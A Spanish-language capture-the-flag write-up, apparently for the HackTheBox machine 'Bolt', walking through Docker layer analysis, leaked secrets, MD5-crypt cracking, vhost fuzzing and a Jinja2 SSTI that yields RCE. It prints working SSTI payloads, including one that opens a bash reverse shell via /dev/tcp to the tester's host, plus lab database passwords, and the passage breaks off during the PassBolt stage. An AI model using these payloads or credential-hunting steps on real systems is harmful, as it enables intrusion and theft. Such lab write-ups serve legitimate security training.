---
title: Bolt
os: Linux
published: 2026-07-12
tags: [Docker Image Analysis, Information Leakage, Subdomain Enumeration, Server Side Template Injection, RCE, Abusing PassBolt, Abusing GPG, OSCP, eJPT, eWPT, eWPTXv2, OSWE]
category: HackTheBox
---

## Información Básica

**Bolt** es una máquina **Linux** de dificultad media centrada en el _information leakage_. La idea es analizar una imagen de **Docker** publicada por descuido para filtrar credenciales, código fuente y un código de invitación; abusar de un **SSTI** para conseguir RCE, y terminar reutilizando una clave privada **GPG** de la extensión de **PassBolt** para descifrar la contraseña de `root`.

### Técnicas vistas

- Docker Image Analysis (análisis de capas / `layer.tar`)
- Information Leakage
- Subdomain Enumeration
- SSTI (Server Side Template Injection)
- Abusing PassBolt
- Abusing GPG

### Preparación

- eJPT
- eWPT
- eWPTXv2
- OSWE

---

## Reconocimiento

### Nmap

Iniciaremos el escaneo de **Nmap** con la siguiente línea de comandos:

```bash
nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn 10.129.39.254 -oG nmap/allPorts
```

:::tip
Repaso rápido de los flags: `-p-` escanea los 65535 puertos, `--open` filtra solo los abiertos, `-sS` hace un _SYN scan_ (más rápido y sigiloso), `--min-rate 5000` fuerza un mínimo de paquetes por segundo, `-n` evita la resolución DNS y `-Pn` asume que el host está vivo (sin _ping_ previo).
:::

```
PORT    STATE SERVICE REASON
22/tcp  open  ssh     syn-ack ttl 63
80/tcp  open  http    syn-ack ttl 63
443/tcp open  https   syn-ack ttl 63
```

Ahora con la función **extractPorts** (_Función de S4vitar_), extraeremos los puertos abiertos y nos los copiaremos al clipboard para hacer un escaneo más profundo:

```bash
nmap -sVC -p22,80,443 10.129.39.254 -oN nmap/targeted
```

```
PORT    STATE SERVICE  VERSION
22/tcp  open  ssh      OpenSSH 8.2p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 4d:20:8a:b2:c2:8c:f5:3e:be:d2:e8:18:16:28:6e:8e (RSA)
|   256 7b:0e:c7:5f:5a:4c:7a:11:7f:dd:58:5a:17:2f:cd:ea (ECDSA)
|_  256 a7:22:4e:45:19:8e:7d:3c:bc:df:6e:1d:6c:4f:41:56 (ED25519)
80/tcp  open  http     nginx 1.18.0 (Ubuntu)
|_http-server-header: nginx/1.18.0 (Ubuntu)
|_http-title:     Starter Website -  About 
443/tcp open  ssl/http nginx 1.18.0 (Ubuntu)
|_ssl-date: TLS randomness does not represent time
| http-title: Passbolt | Open source password manager for teams
|_Requested resource was /auth/login?redirect=%2F
| ssl-cert: Subject: commonName=passbolt.bolt.htb/organizationName=Internet Widgits Pty Ltd/stateOrProvinceName=Some-State/countryName=AU
| Not valid before: 2021-02-24T19:11:23
|_Not valid after:  2022-02-24T19:11:23
|_http-server-header: nginx/1.18.0 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

:::note
El certificado TLS del puerto `443` ya nos regala información valiosa: el `commonName=passbolt.bolt.htb`. De aquí sacamos dos cosas — el dominio base `bolt.htb` y el subdominio `passbolt.bolt.htb` — que añadiremos al `/etc/hosts` antes de seguir. Revisar siempre el `ssl-cert` es un clásico de _information leakage_.
:::

```bash
echo "10.129.39.254 bolt.htb passbolt.bolt.htb" | sudo tee -a /etc/hosts
```

## whatweb

Analizaremos la IP y los **subdominios** que encontramos, primero añadiéndolos al `/etc/hosts` para que puedan resolverse:

```bash
❯ whatweb http://10.129.41.232
http://10.129.41.232 [200 OK] Bootstrap, Country[RESERVED][ZZ], Email[example@company.com], HTML5, HTTPServer[Ubuntu Linux][nginx/1.18.0 (Ubuntu)], IP[10.129.41.232], JQuery, Meta-Author[Themesberg], Open-Graph-Protocol[website], Script, Title[Starter Website -  About][Title element contains newline(s)!], nginx[1.18.0]
❯ whatweb http://bolt.htb
http://bolt.htb [200 OK] Bootstrap, Country[RESERVED][ZZ], Email[example@company.com], HTML5, HTTPServer[Ubuntu Linux][nginx/1.18.0 (Ubuntu)], IP[10.129.41.232], JQuery, Meta-Author[Themesberg], Open-Graph-Protocol[website], Script, Title[Starter Website -  About][Title element contains newline(s)!], nginx[1.18.0]
❯ whatweb https://passbolt.bolt.htb
https://passbolt.bolt.htb [302 Found] Cookies[passbolt_session], Country[RESERVED][ZZ], HTTPServer[Ubuntu Linux][nginx/1.18.0 (Ubuntu)], HttpOnly[passbolt_session], IP[10.129.41.232], RedirectLocation[/auth/login?redirect=%2F], UncommonHeaders[content-security-policy], nginx[1.18.0]
https://passbolt.bolt.htb/auth/login?redirect=%2F [200 OK] Cookies[csrfToken], Country[RESERVED][ZZ], Django, HTML5, HTTPServer[Ubuntu Linux][nginx/1.18.0 (Ubuntu)], IP[10.129.41.232], Script, Strict-Transport-Security[max-age=31536000; includeSubDomains], Title[Passbolt | Open source password manager for teams], UncommonHeaders[x-permitted-cross-domain-policies,referrer-policy,x-download-options,x-content-type-options,x-gpgauth-version,x-gpgauth-login-url,x-gpgauth-logout-url,x-gpgauth-verify-url,x-gpgauth-pubkey-url,access-control-expose-headers,x-gpgauth-authenticated,x-gpgauth-progress,x-gpgauth-error,x-gpgauth-debug,content-security-policy], X-Frame-Options[sameorigin], nginx[1.18.0]
```

:::note
Fíjate en las cabeceras `x-gpgauth-*` de `passbolt.bolt.htb`: son propias de **PassBolt**, un gestor de contraseñas que autentica a los usuarios mediante **GPG**. Es una pista temprana de que más adelante tendremos que pelearnos con claves PGP.
:::

## bolt.htb

Lo único interesante que podemos encontrar en el dominio `bolt.htb` de momento, es una página donde podemos descargar una imagen de **Docker**:

![Download Docker](./1.png)

### Analizando la imagen de Docker

Una imagen de **Docker** exportada (`docker save`) no es más que un `.tar` que contiene todas las **capas** del sistema de archivos, más un `manifest.json` que indica el orden en el que se apilan. Descomprimir la imagen y bucear por sus capas es una técnica de _information leakage_ muy rentable: es habitual encontrar código fuente, ficheros `.env`, bases de datos o secretos que el desarrollador dejó dentro sin querer.

Vamos a extraer la imagen para ver que contiene:

```bash
❯ ls
 187e74706bdc9cb3f44dca230ac7c9962288a5b8bd579c47a36abf64f35c2950   41093412e0da959c80875bb0db640c1302d5bcdffec759a3a5670950272789ad        image.tar
 1be1cefeda09a601dd9baa310a3704d6309dc28f6d213867911cd2257b95677c   745959c3a65c3899f9e1a5319ee5500f199e0cadf8d487b92e2f297441f8c5cf        manifest.json
 2265c5097f0b290a53b7556fd5d721ffad8a4921bfc2a6e378c04859185d27fa   9a3bb655a4d35896e951f1528578693762650f76d7fb3aa791ac8eec9f14bc77        repositories
 3049862d975f250783ddb4ea0e9cb359578da4a06bf84f05a7ea69ad8d508dab   a4ea7da8de7bfbf327b56b0cb794aed9a8487d31e588b75029f6b527af2976f2       
 3350815d3bdf21771408f91da4551ca6f4e82edce74e9352ed75c2e8a5e68162   d693a85325229cdf0fecd248731c346edbc4e02b0c6321e256ffc588a3e6cb26       
 3d7e9c6869c056cdffaace812b4ec198267e26e03e9be25ed81fe92ad6130c6b   859e74798e6c82d5191cd0deaae8c124504052faa654d6691c21577a8fa50811.json 
```

Viendo que tiene bastantes carpetas vamos a ver si siguen alguna estructura con el comando `tree`:

```bash
❯ tree
.
├── 187e74706bdc9cb3f44dca230ac7c9962288a5b8bd579c47a36abf64f35c2950
│   ├── json
│   ├── layer.tar
│   └── VERSION
├── 1be1cefeda09a601dd9baa310a3704d6309dc28f6d213867911cd2257b95677c
│   ├── json
│   ├── layer.tar
│   └── VERSION
├── 2265c5097f0b290a53b7556fd5d721ffad8a4921bfc2a6e378c04859185d27fa
│   ├── json
│   ├── layer.tar
│   └── VERSION
├── 3049862d975f250783ddb4ea0e9cb359578da4a06bf84f05a7ea69ad8d508dab
│   ├── json
│   ├── layer.tar
│   └── VERSION
├── 3350815d3bdf21771408f91da4551ca6f4e82edce74e9352ed75c2e8a5e68162
│   ├── json
│   ├── layer.tar
│   └── VERSION
├── 3d7e9c6869c056cdffaace812b4ec198267e26e03e9be25ed81fe92ad6130c6b
│   ├── json
│   ├── layer.tar
│   └── VERSION
├── 41093412e0da959c80875bb0db640c1302d5bcdffec759a3a5670950272789ad
│   ├── json
│   ├── layer.tar
│   └── VERSION
├── 745959c3a65c3899f9e1a5319ee5500f199e0cadf8d487b92e2f297441f8c5cf
│   ├── json
│   ├── layer.tar
│   └── VERSION
├── 859e74798e6c82d5191cd0deaae8c124504052faa654d6691c21577a8fa50811.json
├── 9a3bb655a4d35896e951f1528578693762650f76d7fb3aa791ac8eec9f14bc77
│   ├── json
│   ├── layer.tar
│   └── VERSION
├── a4ea7da8de7bfbf327b56b0cb794aed9a8487d31e588b75029f6b527af2976f2
│   ├── json
│   ├── layer.tar
│   └── VERSION
├── d693a85325229cdf0fecd248731c346edbc4e02b0c6321e256ffc588a3e6cb26
│   ├── json
│   ├── layer.tar
│   └── VERSION
├── image.tar
├── manifest.json
└── repositories

12 directories, 37 files
```

Vamos a ver que contiene cada `layer.tar` para ver si podemos encontrar algo interesante con el siguiente comando:

:::tip
La idea del one-liner es listar el contenido de **cada** capa (`tar -tf`) y filtrar con `grep -vE` los directorios típicos del sistema (`usr`, `etc`, `bin`, `lib`...) para que solo destaque lo que **no** debería estar ahí: ficheros de aplicación, secretos y bases de datos. El `sed` de después simplemente antepone el nombre de la capa a cada línea para saber en cuál está cada hallazgo.
:::

```bash
❯ find . -name "layer.tar" | while read layer; do
    tar -tf "$layer" \
    | grep -vE "usr|etc|app|var|sbin|lib|bin|root|tmp" \
    | sed "s|^|[$layer] |"
done
[./9a3bb655a4d35896e951f1528578693762650f76d7fb3aa791ac8eec9f14bc77/layer.tar] __pycache__/
[./9a3bb655a4d35896e951f1528578693762650f76d7fb3aa791ac8eec9f14bc77/layer.tar] __pycache__/.wh..wh..opq
[./9a3bb655a4d35896e951f1528578693762650f76d7fb3aa791ac8eec9f14bc77/layer.tar] __pycache__/config.cpython-36.pyc
[./9a3bb655a4d35896e951f1528578693762650f76d7fb3aa791ac8eec9f14bc77/layer.tar] __pycache__/gunicorn-cfg.cpython-36.pyc
[./9a3bb655a4d35896e951f1528578693762650f76d7fb3aa791ac8eec9f14bc77/layer.tar] __pycache__/run.cpython-36.pyc
[./a4ea7da8de7bfbf327b56b0cb794aed9a8487d31e588b75029f6b527af2976f2/layer.tar] db.sqlite3
[./187e74706bdc9cb3f44dca230ac7c9962288a5b8bd579c47a36abf64f35c2950/layer.tar] dev/
[./187e74706bdc9cb3f44dca230ac7c9962288a5b8bd579c47a36abf64f35c2950/layer.tar] home/
[./187e74706bdc9cb3f44dca230ac7c9962288a5b8bd579c47a36abf64f35c2950/layer.tar] media/
[./187e74706bdc9cb3f44dca230ac7c9962288a5b8bd579c47a36abf64f35c2950/layer.tar] media/cdrom/
[./187e74706bdc9cb3f44dca230ac7c9962288a5b8bd579c47a36abf64f35c2950/layer.tar] media/floppy/
[./187e74706bdc9cb3f44dca230ac7c9962288a5b8bd579c47a36abf64f35c2950/layer.tar] media/usb/
[./187e74706bdc9cb3f44dca230ac7c9962288a5b8bd579c47a36abf64f35c2950/layer.tar] mnt/
[./187e74706bdc9cb3f44dca230ac7c9962288a5b8bd579c47a36abf64f35c2950/layer.tar] proc/
[./187e74706bdc9cb3f44dca230ac7c9962288a5b8bd579c47a36abf64f35c2950/layer.tar] run/
[./187e74706bdc9cb3f44dca230ac7c9962288a5b8bd579c47a36abf64f35c2950/layer.tar] srv/
[./187e74706bdc9cb3f44dca230ac7c9962288a5b8bd579c47a36abf64f35c2950/layer.tar] sys/
[./745959c3a65c3899f9e1a5319ee5500f199e0cadf8d487b92e2f297441f8c5cf/layer.tar] .env
[./745959c3a65c3899f9e1a5319ee5500f199e0cadf8d487b92e2f297441f8c5cf/layer.tar] config.py
[./745959c3a65c3899f9e1a5319ee5500f199e0cadf8d487b92e2f297441f8c5cf/layer.tar] gunicorn-cfg.py
[./745959c3a65c3899f9e1a5319ee5500f199e0cadf8d487b92e2f297441f8c5cf/layer.tar] requirements.txt
[./745959c3a65c3899f9e1a5319ee5500f199e0cadf8d487b92e2f297441f8c5cf/layer.tar] run.py
[./3049862d975f250783ddb4ea0e9cb359578da4a06bf84f05a7ea69ad8d508dab/layer.tar] .wh.db.sqlite3
```

Extraeremos el `layer.tar` que contiene el .env que es lo más interesante:

```bash
❯ tar -xvf ./745959c3a65c3899f9e1a5319ee5500f199e0cadf8d487b92e2f297441f8c5cf/layer.tar
.env
config.py
gunicorn-cfg.py
requirements.txt
run.py
❯ cd ./745959c3a65c3899f9e1a5319ee5500f199e0cadf8d487b92e2f297441f8c5cf/
❯ ls
 json   layer.tar   VERSION
❯ ls -la
drwxr-xr-x alejandro alejandro 4.0 KB Fri Mar  5 18:54:01 2021  .
drwxrwxr-x alejandro alejandro 4.0 KB Sun Jul 19 20:41:46 2026  ..
.rw-r--r-- alejandro alejandro 482 B  Fri Mar  5 18:54:01 2021  json
.rw-r--r-- alejandro alejandro 7.5 KB Fri Mar  5 18:54:01 2021  layer.tar
.rw-r--r-- alejandro alejandro   3 B  Fri Mar  5 18:54:01 2021  VERSION
❯ tar -xvf layer.tar
.env
config.py
gunicorn-cfg.py
requirements.txt
run.py
❯ ls
 config.py   gunicorn-cfg.py   json   layer.tar  󰌠 requirements.txt   run.py   VERSION
```

```title=".env"
─────┬──────────────────────────────────────────────────────────────────────
     │ File: .env
─────┼──────────────────────────────────────────────────────────────────────
   1 │ DEBUG=True
   2 │ SECRET_KEY=S3cr3t_K#Key
   3 │ DB_ENGINE=postgresql
   4 │ DB_NAME=appseed-flask
   5 │ DB_HOST=localhost
   6 │ DB_PORT=5432
   7 │ DB_USERNAME=appseed
   8 │ DB_PASS=pass
─────┴──────────────────────────────────────────────────────────────────────
```

:::note
El `DEBUG=True` es un detalle importante: nos confirma que la aplicación **Flask** corre en modo depuración. Eso más adelante nos regalará _tracebacks_ detallados y, sobre todo, hace que el motor de plantillas **Jinja2** sea el terreno perfecto para el **SSTI** que explotaremos.
:::

Nos quedamos solo con las líneas interesantes del `config.py`:

```python title="config.py"
─────┬──────────────────────────────────────────────────────────────────────
     │ File: config.py
─────┼──────────────────────────────────────────────────────────────────────
   6 │ import os
   7 │ from   decouple import config
   9 │ class Config(object):
  11 │     basedir    = os.path.abspath(os.path.dirname(__file__))
  13 │     # Set up the App SECRET_KEY
  14 │     SECRET_KEY = config('SECRET_KEY', default='S#perS3crEt_007')
  16 │     # This will create a file in <app> FOLDER
  17 │     SQLALCHEMY_DATABASE_URI = 'sqlite:///' + os.path.join(basedir, 'db.sqlite3')
     │ [...]
  27 │ class ProductionConfig(Config):
  35 │     # PostgreSQL database
  36 │     SQLALCHEMY_DATABASE_URI = '{}://{}:{}@{}:{}/{}'.format(
  37 │         config( 'DB_ENGINE'   , default='postgresql'    ),
  38 │         config( 'DB_USERNAME' , default='appseed'       ),
  39 │         config( 'DB_PASS'     , default='pass'          ),
  40 │         config( 'DB_HOST'     , default='localhost'     ),
  41 │         config( 'DB_PORT'     , default=5432            ),
  42 │         config( 'DB_NAME'     , default='appseed-flask' )
  43 │     )
─────┴──────────────────────────────────────────────────────────────────────
```

Como podemos ver tenemos una app de **Flask** combinada con el servicio **Gunicorn**. Además también tenemos credenciales de lo que parece ser una base de datos tipo `sqlite3`. Recuerda que en la propia imagen habíamos localizado un `db.sqlite3` dentro de una de las capas, así que vamos a por él.

### Base de datos SQLite

Vamos a buscar donde esta esa base de datos y a volcar su contenido:

```bash
❯ find . -type f -name db.sqlite3
./a4ea7da8de7bfbf327b56b0cb794aed9a8487d31e588b75029f6b527af2976f2/db.sqlite3
❯ cd a4ea7da8de7bfbf327b56b0cb794aed9a8487d31e588b75029f6b527af2976f2
❯ sqlite3 -column -header
SQLite version 3.46.1 2024-08-13 09:16:08
sqlite> .open db.sqlite3
sqlite> .tables
User
sqlite> select * from user;
id  username  email           password                            email_confirmed  profile_update
--  --------  --------------  ----------------------------------  ---------------  --------------
1   admin     admin@bolt.htb  $1$sm1RceCh$rSd3PygnS/6jlFDfF2J5q.
```

Tenemos un usuario y el hash de una contraseña el cual primero deberemos identificar su tipo:

```bash
❯ hash-identifier
[...]
--------------------------------------------------
 HASH: $1$sm1RceCh$rSd3PygnS/6jlFDfF2J5q.

Possible Hashs:
[+] MD5(Unix)
```

:::tip
El prefijo `$1$` del hash es la pista clave: identifica un **MD5-crypt** (el formato clásico de `/etc/shadow` en Unix). En John lo tratamos con `--format=md5crypt`. Como regla general, memorizar los prefijos ayuda mucho: `$1$` → MD5-crypt, `$5$` → SHA-256-crypt, `$6$` → SHA-512-crypt, `$2a$/$2y$` → bcrypt.
:::

Ahora que sabemos que tipo de hash es lo crackearemos con:

```bash
❯ john --wordlist=/usr/share/wordlists/rockyou.txt --format=md5crypt-long hash
Created directory: /home/alejandro/.john
Using default input encoding: UTF-8
Loaded 1 password hash (md5crypt-long, crypt(3) $1$ (and variants) [MD5 32/64])
Will run 4 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
Verbosity now 2
1g 0:00:00:11 DONE (2026-07-26 00:31) 0.08598g/s 14852p/s 14852c/s 14852C/s delicioso..deadbeat
Use the "--show" option to display all of the cracked passwords reliably
Session completed. 
❯ john hash --show
?:deadbolt

1 password hash cracked, 0 left
```

Ahora nos intentaremos loguear con las credenciales `admin:deadbolt`:

![Admin Dashboard](./2.png)

No es muy interesante a parte de un chat que encontramos, asi que seguiremos con un reconocimiento de subdominios:

### Enumeración de subdominios

:::tip
Con `-H "Host: FUZZ.bolt.htb"` fuzzeamos la cabecera `Host` (virtual hosting). El truco está en el `-fw 10870`: primero lanzas la petición contra un subdominio inexistente, cuentas las palabras de la respuesta por defecto (10870) y filtras por ese valor con `-fw` para que solo aparezcan los _vhosts_ que respondan **algo distinto** al comodín.
:::

```bash
❯ ffuf -u http://bolt.htb -fw 10870 -H "Host: FUZZ.bolt.htb" -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v2.1.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : http://bolt.htb
 :: Wordlist         : FUZZ: /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt
 :: Header           : Host: FUZZ.bolt.htb
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
 :: Filter           : Response words: 10870
________________________________________________

demo                    [Status: 302, Size: 219, Words: 22, Lines: 4, Duration: 90ms]
mail                    [Status: 200, Size: 4943, Words: 345, Lines: 99, Duration: 118ms]
```

Los añadiremos al `/etc/hosts`

![Register Page](./3.png)

Como véis nos pide un código de invitación. Si investigamos un poco buscando rutas de flask con `find . -type f -name "routes.py"`:

```bash
❯ find . -type f -name "routes.py"

./2265c5097f0b290a53b7556fd5d721ffad8a4921bfc2a6e378c04859185d27fa/app/base/routes.py
./41093412e0da959c80875bb0db640c1302d5bcdffec759a3a5670950272789ad/app/home/routes.py
./41093412e0da959c80875bb0db640c1302d5bcdffec759a3a5670950272789ad/app/base/routes.py
```

### Código de invitación en el código fuente

Al revisar la función `register()` de una de las rutas, vemos que el código de invitación está **hardcodeado** en el propio backend. Nos quedamos con la parte relevante:

```python title="app/base/routes.py"
[...]
@blueprint.route('/register', methods=['GET', 'POST'])
def register():
    login_form = LoginForm(request.form)
    create_account_form = CreateAccountForm(request.form)
    if 'register' in request.form:

        username  = request.form['username']
        email     = request.form['email'   ]
        code	  = request.form['invite_code']
        if code != 'XNSS-HSJW-3NGU-8XTJ':          # <-- código de invitación
            return render_template('code-500.html')
        data = User.query.filter_by(email=email).first()
        if data is None and code == 'XNSS-HSJW-3NGU-8XTJ':
            [...]
            # else we can create the user
            user = User(**request.form)
            db.session.add(user)
            db.session.commit()
            [...]
    else:
        return render_template( 'accounts/register.html', form=create_account_form)
[...]
```

En el código encontramos el código de invitación `XNSS-HSJW-3NGU-8XTJ`.

:::note
De paso, fíjate en `user = User(**request.form)`: la aplicación construye el objeto `User` con **todos** los campos del formulario sin filtrar (_mass assignment_). No lo necesitamos aquí, pero es el tipo de patrón inseguro que conviene tener en el radar en un examen como el **OSWE**.
:::

Con esto ya podemos acceder a los subdominios `demo` y `mail`:

![Demo Dashboard](./4.png)

# Explotación

## SSTI (Server Side Template Injection)

Después de buscar un rato por el Dashboard, vemos que es vulnerable a **Server Side Template Injection**:

![Profile Page](./5.png)

:::tip
Para detectar un **SSTI** el primer paso siempre es inyectar una operación matemática entre las llaves de la plantilla, como `{{7*7}}`. Si en la respuesta ves `49` en lugar del texto literal, es que el servidor está **evaluando** la expresión → tienes SSTI. Como en el `.env` vimos que la app es **Flask**, el motor detrás es **Jinja2**.
:::

![SSTI Funcional](./6.png)

Buscando payloads en [PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Server%20Side%20Template%20Injection/Python.md#jinja2---basic-injection), encontramos el siguiente payload que funciona:

```python
{{ cycler.__init__.__globals__.os.popen('id').read() }}
```

:::note
**¿Por qué funciona este payload?** Jinja2 no da acceso directo a `os`, así que se hace un _escape_ del _sandbox_: partimos de un objeto accesible (`cycler`), subimos hasta su constructor (`__init__`) y desde ahí saltamos a los `__globals__` del módulo, que ya exponen el módulo `os`. Con `os.popen('id').read()` ejecutamos el comando y leemos su salida. Objetos como `cycler`, `joiner` o `lipsum` son los "puentes" habituales para llegar a `os` en Jinja2.
:::

![RCE SSTI](./7.png)

### Reverse Shell

Confirmado el RCE, vamos a entablar una reverse shell. Nos ponemos en escucha con `nc` e inyectamos el siguiente payload:

```python
 {{ cycler.__init__.__globals__.os.popen('bash -c "bash -i >& /dev/tcp/10.10.15.31/8888 0>&1"').read() }}
```

```bash
❯ nc -lvnp 8888
listening on [any] 8888 ...
connect to [10.10.15.31] from (UNKNOWN) [10.129.35.240] 33130
bash: cannot set terminal process group (863): Inappropriate ioctl for device
bash: no job control in this shell
www-data@bolt:~/demo$ whoami
www-data
```

:::tip
Lo primero tras recibir la shell es hacer el **tratamiento de la TTY** para poder usar `Ctrl+C`, autocompletado e historial sin perder la conexión:

```bash
script /dev/null -c bash      # o: python3 -c 'import pty; pty.spawn("/bin/bash")'
# Ctrl+Z
stty raw -echo; fg
reset xterm
export TERM=xterm SHELL=bash
```
:::

# Escalada de privilegios

## www-data

Tenemos una **Reverse Shell** entablada con éxito, vamos a ver que usuarios tenemos en la máquina:

```bash
www-data@bolt:~/demo$ cat /etc/passwd | grep -v "false\|nologin" | tr ":" " " | column -t
root   x  0     0      root   /root        /bin/bash
sync   x  4     65534  sync   /bin         /bin/sync
eddie  x  1000  1000   Eddie  Johnson,,,   /home/eddie  /bin/bash
clark  x  1001  1001   Clark  Griswold,,,  /home/clark  /bin/bash
www-data@bolt:~/demo$ ls -la /home/eddie
ls: cannot open directory '/home/eddie': Permission denied
www-data@bolt:~/demo$ ls -la /home/clark
ls: cannot open directory '/home/clark': Permission denied
```

No tenemos permisos para ningún usuario. Mirando que tenemos en la carpeta actual encontramos unas credenciales de base de datos:

```bash
www-data@bolt:~/demo$ ls -la
total 36
drwxr-xr-x 5 www-data www-data 4096 Aug  4  2021 .
drwxr-xr-x 6 root     root     4096 Aug  4  2021 ..
-rw-r--r-- 1 www-data www-data 6399 Mar  6  2021 app.py
-rw-r--r-- 1 www-data www-data  420 Mar  4  2021 config.py
drwxr-xr-x 2 www-data www-data 4096 Mar  6  2021 __pycache__
drwxr-xr-x 3 www-data www-data 4096 Mar  4  2021 static
drwxrwxr-x 6 www-data www-data 4096 Mar  5  2021 templates
-rw-r--r-- 1 www-data www-data   62 Mar  4  2021 wsgi.py
www-data@bolt:~/demo$ cat config.py 
"""Flask Configuration"""
#SQLALCHEMY_DATABASE_URI = 'sqlite:///database.db'
SQLALCHEMY_DATABASE_URI = 'mysql://bolt_dba:dXUUHSW9vBpH5qRB@localhost/boltmail'
SQLALCHEMY_TRACK_MODIFICATIONS = True
SECRET_KEY = 'kreepandcybergeek'
MAIL_SERVER = 'localhost'
MAIL_PORT = 25
MAIL_USE_TLS = False
MAIL_USE_SSL = False
#MAIL_DEBUG = app.debug
MAIL_USERNAME = None
MAIL_PASSWORD = None
DEFAULT_MAIL_SENDER = 'support@bolt.htb'
```

Vamos a investigar que hay:

```bash
www-data@bolt:~/demo$ mysql --user=bolt_dba --password=dXUUHSW9vBpH5qRB --database=boltmail
mysql: [Warning] Using a password on the command line interface can be insecure.
[...]
mysql> show tables;
+--------------------+
| Tables_in_boltmail |
+--------------------+
| user               |
+--------------------+
1 row in set (0.00 sec)

mysql> describe user;
+-----------------+---------------+------+-----+---------+----------------+
| Field           | Type          | Null | Key | Default | Extra          |
+-----------------+---------------+------+-----+---------+----------------+
| id              | int           | NO   | PRI | NULL    | auto_increment |
| username        | varchar(255)  | YES  |     | NULL    |                |
| password        | varchar(255)  | YES  |     | NULL    |                |
| email           | varchar(255)  | YES  |     | NULL    |                |
| host_header     | varchar(255)  | YES  |     | NULL    |                |
| ip_address      | varchar(255)  | YES  |     | NULL    |                |
| email_confirmed | tinyint(1)    | YES  |     | NULL    |                |
| profile_confirm | tinyint(1)    | YES  |     | NULL    |                |
| profile_update  | varchar(4096) | YES  |     | NULL    |                |
+-----------------+---------------+------+-----+---------+----------------+
9 rows in set (0.00 sec)

mysql> select username, password from user;
+-----------+------------------------------------+
| username  | password                           |
+-----------+------------------------------------+
| admin     | $1$sm1RceCh$rSd3PygnS/6jlFDfF2J5q. |
| alejandro | $1$KpoHclyu$kJhpx/qCQ127DGV.PScNX0 |
+-----------+------------------------------------+
2 rows in set (0.00 sec)
```

No hay nada interesante, volviendo atrás nos falta de revisar el dominio `passbolt.bolt.htb`:

### PassBolt

![Passbolt Login](./8.png)

Necesitamos una invitación, por lo que no podemos continuar por esta ruta:

![Error](./9.png)

Como ya tenemos acceso a la máquina como `www-data`, vamos a buscar en el sistema de ficheros archivos y directorios relacionados con **passbolt** (configuración, certificados, credenciales de la base de datos...):

```bash
www-data@bolt:~/demo$ find / -type d -name passbolt 2>/dev/null
/etc/passbolt
/usr/share/php/passbolt
/usr/share/passbolt
/var/lib/passbolt
/var/log/passbolt
www-data@bolt:~/demo$ find / -type f -name "passbolt.*" 2>/dev/null
/etc/apt/sources.list.d/passbolt.list
/etc/ssl/certs/passbolt.bolt.htb.crt
/etc/passbolt/passbolt.php
/etc/passbolt/passbolt.default.php
/usr/share/php/passbolt/plugins/Passbolt/WebInstaller/templates/Config/passbolt.php
```

El archivo `/etc/passbolt/passbolt.php` me llama la atención, vamos a ver que contiene:

```bash
www-data@bolt:~/demo$ cat /etc/passbolt/passbolt.php
[...]
    'Datasources' => [
        'default' => [
            'host' => 'localhost',
            'port' => '3306',
            'username' => 'passbolt',
            'password' => 'rT2;jW7<eY8!dX8}pQ8%',
            'database' => 'passboltdb',
        ],
    ],
[...]
```

Como vemos, tenemos otras credenciales de base de datos. Nos conectamos a `passboltdb` y revisamos la tabla `secrets`, donde PassBolt almacena las contraseñas de los usuarios:

```bash
www-data@bolt:~/demo$ mysql --user=passbolt --password='rT2;jW7<eY8!dX8}pQ8%' --database=passboltdb
[...]
mysql> select data from secrets;
-----BEGIN PGP MESSAGE-----
Version: OpenPGP.js v4.10.9
Comment: https://openpgpjs.org

wcBMA/ZcqHmj13/kAQgAkS/2GvYLxglAIQpzFCydAPOj6QwdVV5BR17W5psc
g/ajGlQbkE6wgmpoV7HuyABUjgrNYwZGN7ak2Pkb+/3LZgtpV/PJCAD030kY
pCLSEEzPBiIGQ9VauHpATf8YZnwK1JwO/BQnpJUJV71YOon6PNV71T2zFr3H
oAFbR/wPyF6Lpkwy56u3A2A6lbDb3sRl/SVIj6xtXn+fICeHjvYEm2IrE4Px
l+DjN5Nf4aqxEheWzmJwcyYqTsZLMtw+rnBlLYOaGRaa8nWmcUlMrLYD218R
zyL8zZw0AEo6aOToteDPchiIMqjuExsqjG71CO1ohIIlnlK602+x7/8b7nQp
edLA7wF8tR9g8Tpy+ToQOozGKBy/auqOHO66vA1EKJkYSZzMXxnp45XA38+u
l0/OwtBNuNHreOIH090dHXx69IsyrYXt9dAbFhvbWr6eP/MIgh5I0RkYwGCt
oPeQehKMPkCzyQl6Ren4iKS+F+L207kwqZ+jP8uEn3nauCmm64pcvy/RZJp7
FUlT7Sc0hmZRIRQJ2U9vK2V63Yre0hfAj0f8F50cRR+v+BMLFNJVQ6Ck3Nov
8fG5otsEteRjkc58itOGQ38EsnH3sJ3WuDw8ifeR/+K72r39WiBEiE2WHVey
5nOF6WEnUOz0j0CKoFzQgri9YyK6CZ3519x3amBTgITmKPfgRsMy2OWU/7tY
NdLxO3vh2Eht7tqqpzJwW0CkniTLcfrzP++0cHgAKF2tkTQtLO6QOdpzIH5a
Iebmi/MVUAw3a9J+qeVvjdtvb2fKCSgEYY4ny992ov5nTKSH9Hi1ny2vrBhs
nO9/aqEQ+2tE60QFsa2dbAAn7QKk8VE2B05jBGSLa0H7xQxshwSQYnHaJCE6
TQtOIti4o2sKEAFQnf7RDgpWeugbn/vphihSA984
=P38i
-----END PGP MESSAGE-----
1 row in set (0.00 sec)
```

Parece ser un mensaje encriptado en **PGP**, pero aparte de esto no encontramos nada.

:::note
